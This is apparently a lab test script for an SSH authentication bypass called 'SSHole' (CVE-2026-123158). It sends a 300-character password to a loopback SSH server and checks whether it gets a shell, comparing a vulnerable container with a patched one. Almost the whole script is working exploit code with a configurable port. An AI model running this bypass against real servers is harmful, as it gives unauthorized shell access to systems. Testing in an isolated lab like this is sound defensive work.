#!/usr/bin/env bash
# SSHole bypass TEST for the isolated lab (CVE-2026-123158).
#
# Authorized-use only. This script demonstrates the authentication bypass
# against the lab's OWN loopback target so you can verify that:
#   * the vulnerable container (port 2222) accepts the long-password login, and
#   * the secure container      (port 2223) rejects it.
#
# Usage:
#   ./scripts/test-bypass.sh [port] [user]
#   ./scripts/test-bypass.sh 2222 deploy    # vulnerable (should succeed)
#   ./scripts/test-bypass.sh 2223 deploy    # secure (should fail)
#
# Requires: python3. Uses expect if available, otherwise SSH_ASKPASS fallback.
set -uo pipefail

PORT="${1:-2222}"
TARGET_USER="${2:-deploy}"
HOST="127.0.0.1"

PW="$(python3 -c 'print("A"*300)')"
SSH_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no \
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p $PORT"

echo "=== SSHole bypass test (CVE-2026-123158) ==="
echo "target : ${TARGET_USER}@${HOST}:${PORT}"
echo "method : 300 x 'A' (> 256 bytes) against a '*' account"
echo

# Preferred: expect feeds the password cleanly and yields an interactive shell.
if command -v expect >/dev/null 2>&1; then
  expect -c "
set timeout 10
set pw [string repeat A 300]
spawn ssh $SSH_OPTS ${TARGET_USER}@${HOST}
expect {
  -re {assword:} { send \"\$pw\r\"; exp_continue }
  -re {\\\$ |# |~} {
    puts \"\n\[+\] LOGIN SUCCEEDED -- target is vulnerable to SSHole.\"
    send \"echo SHELL_AS=\\\$(id -un) uid=\\\$(id -u); exit\r\"
    expect eof
  }
  eof {
    puts \"\n\[-\] Login refused -- target is NOT vulnerable (patched or mitigated).\"
    exit 1
  }
  timeout {
    puts \"\n\[-\] Timeout -- could not connect.\"
    exit 1
  }
}
"
  exit $?
fi

# Fallback: SSH_ASKPASS (no interactive shell, just runs a command).
echo "[!] 'expect' not found; using SSH_ASKPASS fallback."
AP="$(mktemp)"
cat > "$AP" <<'ASKPASS'
#!/bin/sh
python3 -c 'import sys; sys.stdout.write("A"*300)'
ASKPASS
chmod +x "$AP"

set +e
SSH_ASKPASS="$AP" SSH_ASKPASS_REQUIRE=force DISPLAY=:0 \
  ssh $SSH_OPTS "${TARGET_USER}@${HOST}" \
  'echo "[+] LOGIN SUCCEEDED as $(id -un) -- uid=$(id -u)"; uname -a'
rc=$?
set -e
rm -f "$AP"

echo
if [ "${rc}" -eq 0 ]; then
  echo ">>> RESULT: login SUCCEEDED -- target is VULNERABLE to SSHole."
else
  echo ">>> RESULT: login failed (exit ${rc}) -- target is NOT vulnerable."
fi

echo
echo "Exit code: ${rc}"
echo "Druk op ENTER om af te sluiten..."
read -r
exit "${rc}"